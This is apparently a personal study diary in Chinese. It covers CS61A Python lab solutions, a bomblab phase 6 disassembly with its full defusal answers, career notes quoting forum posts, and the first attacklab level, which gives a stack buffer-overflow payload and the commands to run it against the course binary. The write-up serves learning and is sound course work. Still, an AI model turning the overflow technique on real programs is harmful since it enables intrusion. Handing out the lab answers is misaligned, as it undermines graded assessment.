## 5.4

要开启新的5月份旅途了！

开始lab05！

python的`append`和`extend`

- `append` 方法用于在列表末尾添加一个元素
- `extend` 方法用于在列表末尾一次性添加另一个序列中的所有元素。

记录下`for`循环中的修改循环变量问题：

在 Python 中，通常不建议在循环体内直接修改循环变量，因为这可能会导致逻辑混乱或者意外的结果。循环变量 `i` 在 `for` 循环中是由迭代器生成的，修改它可能会影响循环的行为。

现在我写的错误代码为：

```py
def insert_items(s, before, after):
    """Insert after into s after each occurrence of before and then return s.

    >>> test_s = [1, 5, 8, 5, 2, 3]
    >>> new_s = insert_items(test_s, 5, 7)
    >>> new_s
    [1, 5, 7, 8, 5, 7, 2, 3]
    >>> test_s
    [1, 5, 7, 8, 5, 7, 2, 3]
    >>> new_s is test_s
    True
    >>> double_s = [1, 2, 1, 2, 3, 3]
    >>> double_s = insert_items(double_s, 3, 4)
    >>> double_s
    [1, 2, 1, 2, 3, 4, 3, 4]
    >>> large_s = [1, 4, 8]
    >>> large_s2 = insert_items(large_s, 4, 4)
    >>> large_s2
    [1, 4, 4, 8]
    >>> large_s3 = insert_items(large_s2, 4, 6)
    >>> large_s3
    [1, 4, 6, 4, 6, 8]
    >>> large_s3 is large_s
    True
    """
    "*** YOUR CODE HERE ***"
    """
        解决思路：
            1. for遍历序列s，查询是否存在等于before的值
            2. e == before, 将after插入到e后面
            3. 索引跳到插入的after值后面
    """
    for i in range(len(s)+1):
        if s[i] == before:
            s.insert(i+1, after)
            i = i + 2
    return s
```

我想要索引略过新插入的after值 ，但是不了解循环变量 `i` 在 `for` 循环中是由迭代器生成的，不能随便修改for循环中的索引i。

这样的结果就是即使在判断中修改了`i`的值，但是回到循环迭代给`i`赋值的阶段，`i`又会重新被迭代器生成的值赋值，所以达不到`i+2`的结果。

所以直接用`while`：

```py
def insert_items(s, before, after):
	i = 0
    while  i < len(s):
        if s[i] == before:
            s.insert(i+1, after)
            i = i + 1
        i += 1
    return s
```

bomblab phase6：

```assembly
=> 0x00000000004010f4 <+0>:     push   %r14
   0x00000000004010f6 <+2>:     push   %r13
   0x00000000004010f8 <+4>:     push   %r12
   0x00000000004010fa <+6>:     push   %rbp
   0x00000000004010fb <+7>:     push   %rbx
   0x00000000004010fc <+8>:     sub    $0x50,%rsp
   0x0000000000401100 <+12>:    mov    %rsp,%r13					#int *r13 = rsp
   0x0000000000401103 <+15>:    mov    %rsp,%rsi
   0x0000000000401106 <+18>:    call   0x40145c <read_six_numbers> #num1 - num6
   0x000000000040110b <+23>:    mov    %rsp,%r14				   #int *r14 = num1 = *rsp
   0x000000000040110e <+26>:    mov    $0x0,%r12d					# int i(r12d) = 0
   0x0000000000401114 <+32>:    mov    %r13,%rbp					# int *rbp = rsp
   0x0000000000401117 <+35>:    mov    0x0(%r13),%eax				# int eax = num1
   0x000000000040111b <+39>:    sub    $0x1,%eax					# if (rsp[0] <= 6)
   0x000000000040111e <+42>:    cmp    $0x5,%eax
   0x0000000000401121 <+45>:    jbe    0x401128 <phase_6+52>
   0x0000000000401123 <+47>:    call   0x40143a <explode_bomb>
   
   #<+0>- <+47>:输入的6个值均小于等于6
   0x0000000000401128 <+52>:    add    $0x1,%r12d					#i ++  (i = 1)
   0x000000000040112c <+56>:    cmp    $0x6,%r12d					# cmp 6 and i
   0x0000000000401130 <+60>:    je     0x401153 <phase_6+95>
  					
  					# if(i < 6)
   0x0000000000401132 <+62>:    mov    %r12d,%ebx				# int ebx = i (ebx = 1)
   0x0000000000401135 <+65>:    movslq %ebx,%rax				# Move sign-extended double word to quad word	
   																# rax = 1
   0x0000000000401138 <+68>:    mov    (%rsp,%rax,4),%eax		# rax = rsp[1]
   0x000000000040113b <+71>:    cmp    %eax,0x0(%rbp)			# if(rsp[1] != rsp[0])		
   0x000000000040113e <+74>:    jne    0x401145 <phase_6+81>
   0x0000000000401140 <+76>:    call   0x40143a <explode_bomb>
   					# rsp[1] != rsp[0]
   0x0000000000401145 <+81>:    add    $0x1,%ebx				# ebx += 1(ebx = 2)
   0x0000000000401148 <+84>:    cmp    $0x5,%ebx				# ebx <= 5
   0x000000000040114b <+87>:    jle    0x401135 <phase_6+65>
   #<+62> - <+87>分析：遍历输入的6个数据，判断是否后五个均不等于num[0]
   
   
   0x000000000040114d <+89>:    add    $0x4,%r13				# *r13 = rsp + 1
   0x0000000000401151 <+93>:    jmp    0x401114 <phase_6+32>
   #<+32> - <+93>：判断是否输入的所有数字均小于等于6，且互不相等
   
   
   					# if(i == 6) 此时满足的条件是：输入的所有数字均小于等于6，且互不相等
   0x0000000000401153 <+95>:    lea    0x18(%rsp),%rsi		# int *rsi = rsp + 6	(24 / 4 = 6 words) = 0
   0x0000000000401158 <+100>:   mov    %r14,%rax			# int *rax = rsp
   0x000000000040115b <+103>:   mov    $0x7,%ecx			# int ecx = 7
   0x0000000000401160 <+108>:   mov    %ecx,%edx			# edx = 7
   0x0000000000401162 <+110>:   sub    (%rax),%edx			# edx = 7 - rsp[0]
   0x0000000000401164 <+112>:   mov    %edx,(%rax)			# *rsp = 7 - rsp[0]
   0x0000000000401166 <+114>:   add    $0x4,%rax			# rax = rsp + 1(*rax = rsp[1])
   0x000000000040116a <+118>:   cmp    %rsi,%rax			# 指针 rax 索引rsp到rsp+5的6个输入数字
   0x000000000040116d <+121>:   jne    0x401160 <phase_6+108>
   #<+95> - <+121>：指针rax索引输入的6个数字，并且重新赋值为num[i] = 7-num[i]
   
   
# ------------------- 将rsp[i]重新赋值为7 - rsp[i]------------------

   0x000000000040116f <+123>:   mov    $0x0,%esi				# int rsi = 0
   0x0000000000401174 <+128>:   jmp    0x401197 <phase_6+163>
   																# eax = 1, *edx = 0x6032d0
   0x0000000000401176 <+130>:   mov    0x8(%rdx),%rdx			# rdx = mem(0x6032d0 + 8) = 6304480
   0x000000000040117a <+134>:   add    $0x1,%eax				# eax ++ (eax = 2)
   0x000000000040117d <+137>:   cmp    %ecx,%eax				# compare eax and ecx(rsp[0])
   0x000000000040117f <+139>:   jne    0x401176 <phase_6+130>	# if eax != rsp[0]: eax ++
   0x0000000000401181 <+141>:   jmp    0x401188 <phase_6+148>	#	此时一定满足rax == rsp[0]


						#if(rsp[i] <= 1)
   0x0000000000401183 <+143>:   mov    $0x6032d0,%edx			# int *edx = 0x6032d0(*edx = 332)
   0x0000000000401188 <+148>:   mov    %rdx,0x20(%rsp,%rsi,2)	# 8（32bytes = 8words--int） + rsp + 2 * rsi = 0x6032d0
   #在40118d打断点，调试可以确认每次将rsp[8+2i]赋值什么了
   
   0x000000000040118d <+153>:   add    $0x4,%rsi				# rsi + 1
   0x0000000000401191 <+157>:   cmp    $0x18,%rsi				# rsi and 6
   0x0000000000401195 <+161>:   je     0x4011ab <phase_6+183>
   
   0x0000000000401197 <+163>:   mov    (%rsp,%rsi,1),%ecx		# ecx = rsp[rsi] 
   0x000000000040119a <+166>:   cmp    $0x1,%ecx				# compare rsp[rsi] and 1 
   0x000000000040119d <+169>:   jle    0x401183 <phase_6+143>	
   # <+143> - <+169>:如果7-num[i]小于等于1，则将给rsp+8(32 = 0x20)、10(40 = 0x28)、12(48 = 0x30)、14(56 = 0x38)、16(64 = 0x40)、18赋值
   # 为0x6032d0
   
   						#if(rsp[i] > 1)
   0x000000000040119f <+171>:   mov    $0x1,%eax				# int eax = 1
   0x00000000004011a4 <+176>:   mov    $0x6032d0,%edx			# int *edx = 0x6032d0
   0x00000000004011a9 <+181>:   jmp    0x401176 <phase_6+130>
   
   
   0x00000000004011ab <+183>:   mov    0x20(%rsp),%rbx			# rbx = rsp[8]
   0x00000000004011b0 <+188>:   lea    0x28(%rsp),%rax			# rax = rsp + 10
   0x00000000004011b5 <+193>:   lea    0x50(%rsp),%rsi			# rsi = rsp + 20
   0x00000000004011ba <+198>:   mov    %rbx,%rcx				# rcx = rsp[8]
   0x00000000004011bd <+201>:   mov    (%rax),%rdx				# rdx = rsp[10]
   0x00000000004011c0 <+204>:   mov    %rdx,0x8(%rcx)			# *(rcx + 0x8) = rsp[10]
   0x00000000004011c4 <+208>:   add    $0x8,%rax				# rax = rsp + 10 + 2
   0x00000000004011c8 <+212>:   cmp    %rsi,%rax				# if rax != rsp+20
   
   0x00000000004011cb <+215>:   je     0x4011d2 <phase_6+222>
   0x00000000004011cd <+217>:   mov    %rdx,%rcx				# rcx = rsp[10]
   0x00000000004011d0 <+220>:   jmp    0x4011bd <phase_6+201>
   # <+183> - <+220>:不知道做了什么，应该是将rsp[10]、rsp[12]、...、rsp[18]的所有值，赋值给
   
   						# if rax == rsp+20
   						# 跳出循环时，rax=rsp+20,rdx = *(rsp+18),rbx = *(rsp + 8)
   0x00000000004011d2 <+222>:   movq   $0x0,0x8(%rdx)
   0x00000000004011da <+230>:   mov    $0x5,%ebp
   0x00000000004011df <+235>:   mov    0x8(%rbx),%rax	# rax = *(rsp[8] + 2);//链表指针域
   0x00000000004011e3 <+239>:   mov    (%rax),%eax		# rax = *(rax);//rax 为node->next
   0x00000000004011e5 <+241>:   cmp    %eax,(%rbx)	# 下一个节点 和 此节点 的低32位数据进行比对		
   0x00000000004011e7 <+243>:   jge    0x4011ee <phase_6+250>	# 保证当前节点的低32位数据要大于下一节点的低32位数据
   
   0x00000000004011e9 <+245>:   call   0x40143a <explode_bomb>
   0x00000000004011ee <+250>:   mov    0x8(%rbx),%rbx
   0x00000000004011f2 <+254>:   sub    $0x1,%ebp
   0x00000000004011f5 <+257>:   jne    0x4011df <phase_6+235>
   0x00000000004011f7 <+259>:   add    $0x50,%rsp
   0x00000000004011fb <+263>:   pop    %rbx
   0x00000000004011fc <+264>:   pop    %rbp
   0x00000000004011fd <+265>:   pop    %r12
   0x00000000004011ff <+267>:   pop    %r13
   0x0000000000401201 <+269>:   pop    %r14
   0x0000000000401203 <+271>:   ret
```

## 5.5

将汇编语言反汇编为C伪代码后：

```C
phase_6(char *str){
    int *rsp = read_six_numbers(str);//rsp[0] = input[0] ---> rsp[5] = input[5]
    for(int i = 0; i < 6; i++){
        //输入数字均小于等于6，且所有数字均不相同
        for(int j = i + 1; j < 6; j++){
            if(rsp[i] > 6 || rsp[j] == rsp[i]){
                return explode_bomb();
            }
        }		
    }
	
	//将所有数字置为7减去自身
	for(int i = 0; i < 6; i++){
		rsp[i] = 7 - rsp[i];
	}
	
	int i = 0;
		
	//rsp[8]、rsp[10]、rsp[12]、rsp[14]、rsp[16]、rsp[18]均会被赋值
	while(i < 6){
		if(rsp[i] <= 1){//7-rsp[i] and 1//	num[i] >= 6
			rsp[8 + 2*i] = 0x6032d0;
		}else{
			int eax = 1;
			int edx = 0x6032d0;
			do{
				//edx = 2：0x006032e0，3：0x006032f0，4：0x00603300，5：0x00603310，6：0x00603320
				edx = *(edx + 0x8);
				eax++;
			}while(eax != rsp[i]);
			//rax == rsp[i]
			rsp[8 + 2*i] = edx;
		}
		i++;
	}
	//修改node节点的指针域
	int rbx = rsp[8]; 	//存储的是链表节点位置/指针域
	int *rax = rsp + 10;
	int *rsi = rsp + 20;//边界
	do{
		// *(rsp[8] + 2) = rsp[10]
		// *(rsp[10] + 2) = rsp[12]
		/* ....
		   *(rsp[16] + 2) = rsp[18]
		*/
		int rcx = rbx;
		int rdx = *rax;
		*(rbx + 2) = *(rax);//修改链表的指针域
		rax = rax + 2;
		&rbx ++;
	}while(rax < rsi);
	
    //判断rsp[8]到rsp[18]所指的节点，值域是否均后一个大于前一个
	//跳出循环时，rax=rsp+20,rdx = *(rsp+18),rbx = *(rsp + 8)
    //rax            0x7fffffffe0b0 == rsp+20
    //rbx            0x603320       == *(rsp + 8)
	//rcx            0x6032e0            6304480
	//rdx            0x6032d0       == *(rsp+18)

	rdx = rsp[18];
	rbx = rsp[8]
	*(rsp[18] + 2) = 0;
	ebp = 5;
    while(ebp != 0){
        rax = *(rsp[8] + 2);//链表指针域
		rax = *(rax);		//将此节点给指针rax
		if(*(rbx) >= rax){//将前一节点（*(rbx)）和后一个节点的值（猜测为值域:哪里为值域）进行比较
			rbx = *(rsp[8] + 2);//rbx指向链表的下一个节点
		//这里保证了修改完指针域后的链表，前一个节点的值要大于后一个节点的值
		}
        ebp--;
    }

	
}
```

补充`0x6032d0`处的数据：

```assembly
(gdb) x/24xw 0x6032d0
0x6032d0 <node1>:       0x0000014c      0x00000001      0x006032e0      0x00000000
0x6032e0 <node2>:       0x000000a8      0x00000002      0x006032f0      0x00000000
0x6032f0 <node3>:       0x0000039c      0x00000003      0x00603300      0x00000000
0x603300 <node4>:       0x000002b3      0x00000004      0x00603310      0x00000000
0x603310 <node5>:       0x000001dd      0x00000005      0x00603320      0x00000000
0x603320 <node6>:       0x000001bb      0x00000006      0x00000000      0x00000000
```

可以看出这是一个链表结构，长度为6，依次存储1到6的值。

经过分析：

1. rsp[8]到rsp[18]保存的是以0x6032d0开头的链表地址
2. 最后一步判断条件，保证修改完指针域后的链表，前一个节点的值要大于后一个节点的值
3. 打印0x6032d0处的数据可以看出，若想值域从大到小排列，那就需要rsp[8]指向结构：node3 -> node4 -> node5 -> node6 -> node1 -> node2。
4. 等日后再分析吧，今晚很累

最终答案为：

```tex
Border relations with Canada have never been better.
1 2 4 8 16 32
2 707
7 0
9on567
4 3 2 1 6 5
```

晚安。

## 5.6

重新回顾`lambda`表达式。

```py
     lambda            x            :          f(g(x))
"A function that    takes x    and returns     f(g(x))"
```

**disc6**

获取大于2024的斐波那契数：

生成大于2024斐波那契数的生成器：`filter(lambda n: n > 2024, gen_fib())`

```python
def gen_fib():
    n, add = 0, 1
    while True:
        yield n
        n, add = n + add, n

next(filter(lambda n: n > 2024, gen_fib()))
```

分析：

- **filter**(*function*, *iterable*)： is equivalent to the generator expression `(item for item in iterable if function(item))`
- `filter()`函数将第一个判断n是否大于2024作为判断条件函数，将生成器函数`gen_fib()`作为可迭代值作为第二个参数，将返回一个迭代器。这个迭代器的作用就是获取大于2024的斐波那契数。
- The `filter` function returns an iterator over, `zip`, and `reversed` functions also return iterators.An iterator object is created that can return results if queried using `next`.

**Q2: Merge**

Write a generator function `merge` that takes in two infinite generators `a` and `b` that are in increasing order without duplicates and returns a generator that has all the elements of both generators, in increasing order, without duplicates.

问题抽象：按照递增序列排两个迭代器的值，并且不能重复

问题分析：

1. 获取两个迭代器的值：v1 = next(a), v2 = next(b)
2. 如果v1 < v2，则yield v1，随后v1 = next(a)
3. 如果v2 < v1，则yield v2，随后v2 = next(b)
4. 如果v1 = v2，则yield v1，随后v1 = next(a)并且v2 = next(b)

```py
def merge(a, b):
    """Q2:
    >>> def sequence(start, step):
    ...     while True:
    ...         yield start
    ...         start += step
    >>> a = sequence(2, 3) # 2, 5, 8, 11, 14, ...
    >>> b = sequence(3, 2) # 3, 5, 7, 9, 11, 13, 15, ...
    >>> result = merge(a, b) # 2, 3, 5, 7, 8, 9, 11, 13, 14, 15
    >>> [next(result) for _ in range(10)]
    [2, 3, 5, 7, 8, 9, 11, 13, 14, 15]
    """
    "*** YOUR CODE HERE ***"
        v1, v2 = next(a), next(b)
    while True:
      if v1 < v2:
          yield v1
          v1 = next(a)
      elif v2 < v1:
          yield v2
          v2 = next(b)
      else:
          yield v1
          v1 = next(a)
          v2 = next(b)
```

## 5.7

leave off：If something continues from where it left off, it starts happening again at the point where it had previously stopped.

feel so lonely,so you can make friends by some ways and do something to make you happy.

## 5.8

`min` 函数在处理字典时，默认情况下会基于字典的键进行比较，并返回具有最小键的键-值对（或者只返回最小的键，取决于具体用法）。`min` 函数的语法格式如下：

```py
min(iterable, key=None, default=...)
```

- `iterable`：要比较的可迭代对象，通常是字典的键或者键值对。
- `key`：可选参数，用于指定比较的关键字函数，类似于 `sorted` 函数中的 `key` 参数。
- `default`：可选参数，在可迭代对象为空时返回的默认值。

```py
coins = {2: 2, 3: 2, 4: 3, 5: 1}
smallest = min(coins)
```

这里的min函数是选出面额（key）最小的硬币。

得到了峰哥的信任，哥们尽量努力不辜负自己的时光。

今天状态不佳，请好好爱自己bro！(●'◡'●)

## 5.9

> ### Q3: Make Change
>
> Implement `make_change`, which takes a positive integer `amount` and a dictionary of `coins`. The `coins` dictionary keys are positive integer denominations and its values are positive integer coin counts. For example, `{1: 4, 5: 2}` represents four pennies and two nickels. The `make_change` function returns a list of coins that sum to `amount`, where the count of any denomination `k` in the return value is at most `coins[k]`.
>
> If there are multiple ways to make change for `amount`, prefer to use as many of the smallest coins available and place the smallest coins first in the returned list.

```py
def make_change(amount, coins):
    """Return a list of coins that sum to amount, preferring the smallest coins
    available and placing the smallest coins first in the returned list.

    The coins argument is a dictionary with keys that are positive integer
    denominations and values that are positive integer coin counts.

    >>> make_change(2, {2: 1})
    [2]
    >>> make_change(2, {1: 2, 2: 1})
    [1, 1]
    >>> make_change(4, {1: 2, 2: 1})
    [1, 1, 2]
    >>> make_change(4, {2: 1}) == None
    True

    >>> coins = {2: 2, 3: 2, 4: 3, 5: 1}
    >>> make_change(4, coins)
    [2, 2]
    >>> make_change(8, coins)
    [2, 2, 4]
    >>> make_change(25, coins)
    [2, 3, 3, 4, 4, 4, 5]
    >>> coins[8] = 1
    >>> make_change(25, coins)
    [2, 2, 4, 4, 5, 8]
    """
    if not coins:
        return None
    smallest = min(coins)
    rest = remove_one(coins, smallest)
    if amount < smallest:
        return None
    elif amount == smallest:	#base case
        return [smallest]
    else:
        result = make_change(amount-smallest, rest)
        # result == None: Unable to perform next split
        if result:
            return [smallest] + result
        else:
            return make_change(amount, rest)
```

开始attack lab:

- reference material for this lab:3.10.3 `Out-of-Bounds Memory References and Buffer Overflow`和3.10.4`Thwarting Buffer Overflow Attacks`

## 5.10

回顾昨天所学的lab06：

1. Q1: Bank Account：要想在account中记录存取钱的流水，需要单独定义一个交易流水类，这个类就是`Transaction`。用户每一次存取钱的时候，都实例化一个交易实例，并且将其存放在这个用户中。

2. Q2: Email：实现一个邮件传输的逻辑。A `Client` can `compose` an email, which it will `send` to the `Server`. The `Server` then delivers it to the `inbox` of another `Client`. To achieve this, a `Server` has a dictionary called `clients` that matches the `recipient_name` in an `Email` to the `Client` object with that name.

   用户可以创建邮件，邮件会自动发送到服务器。

   服务器会将邮件投递到对应收件人的收件箱中。这样服务器就需要有一个对应的用户字典：按照收件人名称来获取收件人的信息，从中获取到收件箱的地址并存放进去。

3. Q3: Make Change：输入一个总金额和手里的零钱字典（面额为key，数量为value），返回一个零钱凑数策略。这个策略需要保证最小面额零钱尽量多，且在列表展示中更靠前。

   解决思路：

   `make_change(amount, coins)`：返回一个硬币面额列表，总和恰好为总金额。

   - 拿一枚最小的面额硬币`smallest`去凑数，用总金额`amount`减去这个硬币的金额，得到剩余总金额`rest_amount`
   - 如果`rest_amount`恰好等于0，证明这个硬币面值`coin`刚好等于总金额`amount`，直接返回`[smallest]`。
   - 如果`rest_amount`小于0，则证明手中的最小面额零钱已经大于总金额了，此时不需要再继续给零钱，直接返回`None`
   - 如果`rest_amount`大于0，则在硬币字典中减去此面额`smallest`硬币一个数量，获得`rest_conis`；并且将剩余金额`rest_amount`作为`amount`，重新调用`make_change(amount, coins)`函数，并且获取返回值`result`。
     - 如果返回值`result`为`None`，则证明剩余金额已经无法被剩余硬币正常凑出，所以直接返回`make_change(amount, rest_conis)`，这样函数调用的时候会直接返回`None`
       - 如果返回值`result`不为`None`，那么证明剩余金额可以被剩余硬币正常凑出，并且返回一个硬币面额列表，此时直接返回`[smallest]+result`

   > 这里的walkthrough分析的很到位：
   >
   > The code for `make_change(amount, coins)` should do the following:
   >
   > 1. Check if `amount == smallest`, in which case return a one-element list containing just `smallest`.
   > 2. Otherwise, call `make_change(amount-smallest, rest)`, which returns either `None` or a list of numbers.
   > 3. If the call in Step 2 returned a list, then return a longer list that includes `smallest` at the front.
   > 4. If the call in Step 2 returned `None`, then there's no way to use the `smallest` coin, so just `make_change(amount, rest)`

刚才跟女朋友交流了一会病情，感觉很好，很喜欢😋

> ## Q4: Change Machine
>
> Complete the `change` method of the `ChangeMachine` class. A `ChangeMachine` instance holds some `coins`, which are initially all pennies. The `change` method takes a positive integer `coin`, adds that coin to its `coins`, and then returns a list that sums to `coin`. The machine prefers to return as many of the smallest coins available, ordered from smallest to largest. The coins returned by `change` are removed from the machine's `coins`.

q4里面关于方法`change`的描述有问题。返回一个列表，其和为`coin`的时候，同时将这个返回值列表从`coin`中删除了。而这里只是说返回值符合和值为`coin`，像是不想告诉大家似得，在后面偷偷补充了下这个返回值会被删除。

如果想考验阅读理解能力的话，那当我没话说。

那么分析下函数`def change(self, coin)`：

- 输入coin后，在此实例的属性`coins`的中添加此coin一个
- 查看`coins`中是否能用比此`coin`小的面额硬币，加起来替换掉这个`coin`
  - 如果存在，则删除这些小的硬币
  - 如果不存在，则删除刚加入的`coin`

具体实现：

```py
def change(self, coin):
    """Return change for coin, removing the result from self.coins."""
    "*** YOUR CODE HERE ***"
    # 如果能替换，则删除result，添加coin；如果不能，直接返回[coin]
    result = make_change(coin, self.coins)
    if result:
        dic_delete_list(self.coins, result)
        # 检查是否存在键 coin，如果不存在则插入并设置值为 1，如果存在则将值自增 1
        self.coins[coin] = self.coins.setdefault(coin, 0) + 1
    else:
        result = [coin]
    return result
```

用到的几个方法：

1. `dic_delete_list(main_dict, list)`删除字典中对应列表的元素：

   使用 `collections.Counter` 对象，它是 Python 标准库中的一个计数器工具，专门用于统计可迭代对象中元素的出现次数，并以字典的形式返回结果。

   ```py
   >>> from collections import Counter 
   >>> Counter(lio) 
   Counter({1: 3, 2: 2})
   >>> dict(Counter(lio)) 
   {1: 3, 2: 2}
   ```

   ```py
   def dic_delete_list(main_dict, list):
       # 将要删除的列表转为字典
       sub_dict = dict(Counter(list))
       # 计算减去子字典后的值
       for key in sub_dict:
           if key in main_dict:
               if main_dict[key] > sub_dict[key]:
                   main_dict[key] -= sub_dict[key]
               else:
                   del main_dict[key]
   ```

2. `setdefault(key, default)` 方法会检查字典中是否存在指定的键 `key`，如果存在则返回对应的值，如果不存在则将 `key` 插入字典并设置默认值 `default`。

一直以来都将github作为代码存放管理平台，今天下午学习下github怎么高效利用：

- 找想要了解的优质开源项目（跟自己学习有关的，然后优质的）
- folk并且提交代码进行合并

我想今年转C++，并且在南京附近能够月入2w。

然后就是自己的C++方向路线的只言片语：

> 贴吧用户_71yDAey： C++这条路，可不能只会C++，要的是整个计算机体系，尤其是网络
>
> [我他妈取名真难](http://c.tieba.baidu.com/home/main?id=tb.1.17156a27.vkUnmtW4-TVvJA2FRjQwtw&ie=utf-8&fr=pb): 老哥不急有我，部门组长叫我三天看完文档，这周跑通一个智能车代码。离谱的是比我先进来一个月的一个人组长叫他一周看完前三章文档，而我3天看完前五章文档，不说了，这几天代码已经看得我头皮发麻了
>
> 壹点点滴滴：三题一题都没写出来 因为我忘了stl操作的相应函数只记得底层原理 下午的面试c++问题都会 但是他后面问了几个mysql的问题 我就会索引 其他都没有答上来 还有http我也不会
>
> 期待：今天去体检了 然后弄一下离职证明 周一入职咯 希望一切顺利 现在完成第一个目标 找到月薪过万的工作 我的下一个目标是 两年内月薪超过2w
>
> 关于深入学习：经过上次被裁 我有了一些危机感 之前我还觉得我能在公司待很久 还在考虑考研或者深入学习技术 然后去看了计算机网络自顶向下这种原理书 导致我在应用上没有多大进步 我觉得还是要有一些危机感的 说实话 现在这家公司我都不知道能待多久 说不定试用期都未必能过 我现在觉得还是先学一些实用技术 以后有时间深入学习原理吧
>
> 现在加班有点猛 已经达到996的强度了 就没什么时间学习 不过我觉得我还是要尽可能抽出时间学习 因为不知道什么时候就被裁了 从上一次被裁后 我觉得我们还是要有危机感 提升自己 不要把希望全寄托在公司 指不定哪天公司就把你裁了
>
> 关于租房：换了个地方租房住 在公司附近 租房费用涨了一千 现在两千八一个月了 但是距离公司路程1分钟 很近很近 之前住的地方上下班总共要花费两个半小时 一个月就要花费五十多个小时在路上 我不太能接受 这时间用来学习多好啊 虽然我现在经济压力很大 但是我依旧要把时间花在学习上 而不是上下班通勤 青春无价 程序员职业生涯是短暂的 我要多花时间学习
>
> 关于困难：
>
> 问了一些人 还有一些up主 都不建议我走音视频 因为专升本在音视频领域很难找到工作 音视频对学历有要求 都建议我做qt/MFC这类客户端 比较好找工作 但是我现在就是做客户端 我感觉客户端没什么难度 天花板也比较低 问别人其实我只是想问问音视频对于学历要求高不高 并不会影响我走音视频道路 即使这条路很难 即使学历不够 我依旧要走这条路 下次跳槽 一定去音视频岗位 不为别的 就喜欢有难度有前景的岗位
>
> 随便这家公司很累 比之前累很多 但是不得不说 个人提升很快 我现在写的代码比之前好太多了 而且不仅仅是代码水平有提升 其他方面也有很大提升 我都感觉我之前被裁是一种幸运 在之前公司我没有什么提升
>
> 贴吧用户_7NMQVU1：加油楼主，记得当时你刚转码培训更新这个系列的时候也有很多人劝退你，你还是坚持下了，还做的很好，你的分享也鼓励到了不少人，觉得楼主是个很有决心执行力很强的人，希望楼主能圆梦
>
> 贴吧用户_aJAVyVy：去年11月工作时候刷贴吧就看到了楼主帖子，我当时和楼主一样也是刚入职待转正，不过我是c#，上位机。
> 去年我特辛苦就准备跳槽，如今清闲下来每天摸鱼混经验。时隔4个月再刷到楼主的续帖，有种照镜子的感觉，楼主这才是程序猿的精神，保持危机感，时刻观察市场，时刻学习技术。 我也立个flag，今年跳槽到南京的c++开发岗
>
> 关于胖猫：我不接：我是没有一丝同情的，唯一的同情的情感就是同情他贫瘠的精神世界，或者说他把这个女生作为自己的精神支柱。老哥的转行之路太励志了，加油

楼主很猛，能一天10h+的学习，心无旁骛的话很厉害。但是也有点急功近利，太着急反而静不下心去解决真正的问题。

博客园默认模式真的丑啊，想学习下如何改善博客园关于自己的博客界面逻辑。

ok，今晚浅尝下attacklab带来的快感。

# attacklab

## Part I: Code Injection Attacks

### level1：

目标：想实现从`test()`函数劫持`getbuf()`，使得获取输入后，直接跳转到目标地址执行`touch1()`。

```c
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
    Getbuf returned 0x%x\n", val);
 }
```

劫持后的函数`touch1()`：

```c
1 void touch1()
2 {
3   vlevel = 1;/* Part of validation protocol */
4   printf("Touch1!: You called touch1()\n");
5   validate(1);
6   exit(0);
7 }
```

Your task is to get `CTARGET` to execute the code for `touch1` when `getbuf` executes its return statement,rather than returning to test.

分析test的汇编代码：

这里可以用用`objdump -d ctarget > ctarget_raw.txt`产生机器码观察getbuf的行为，从而不用gdb动态调试了。

```assembly
(gdb) disassemble test
Dump of assembler code for function test:
   0x0000000000401968 <+0>:     sub    $0x8,%rsp
   0x000000000040196c <+4>:     mov    $0x0,%eax
   0x0000000000401971 <+9>:     call   0x4017a8 <getbuf>
   0x0000000000401976 <+14>:    mov    %eax,%edx
   0x0000000000401978 <+16>:    mov    $0x403188,%esi
   0x000000000040197d <+21>:    mov    $0x1,%edi
   0x0000000000401982 <+26>:    mov    $0x0,%eax
   0x0000000000401987 <+31>:    call   0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:    add    $0x8,%rsp
   0x0000000000401990 <+40>:    ret
End of assembler dump.
```

在`<+9>:     call   0x4017a8 <getbuf>`，我们需要做的就是调用getbuf的时候，输入超长字符串，导致调用getbuf之前保存的返回地址替换为touch1的地址。这样让getbuf调用ret指令时候，会将替换后的地址作为 program counter（%rip）的值，从而实现控制转移。而touch1的地址为：0x4017c0

**确认超长字符串的内容：**

因为返回地址保存在getbuf开辟的地址之上，就需要看下函数getbuf开辟了多少空间：

```assembly
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret
End of assembler dump.
```

可以看出getbuf开辟了0x28（hex） = 40（dec）字节空间，所以可以推断出只要写40个字节的数据，就可以覆盖getbuf开辟的栈空间，并且将41个字节保存touch1的地址（64位数据void*），即可实现level1的要求。

按照8个字节为一个单位，需要5个单位的覆盖值，并且加一个单位的0x4017a8返回地址。这里利用自带的HEX2RAW程序来执行。

exploit.txt文件内容：

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

```bash
unix> ./hex2raw < exploit.txt > exploit-raw.txt
unix> ./ctarget -q -i exploit-raw.txt
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
```

不知道为什么用：

```
unix> cat exploit.txt | ./hex2raw | ./ctarget
```

就会报错，这是为什么呢？chatgpt给的答案是：

> 第一种方法（`cat exploit.txt | ./hex2raw | ./ctarget`）出错的可能原因与输入的处理方式或程序处理输入重定向和管道的方式有关。通过将输入预先转换为原始格式（`exploit-raw.txt`），你可以避开与管道相关的潜在问题。

管道？算了，不是研究重点，先放一下，二周目再来。

### level2

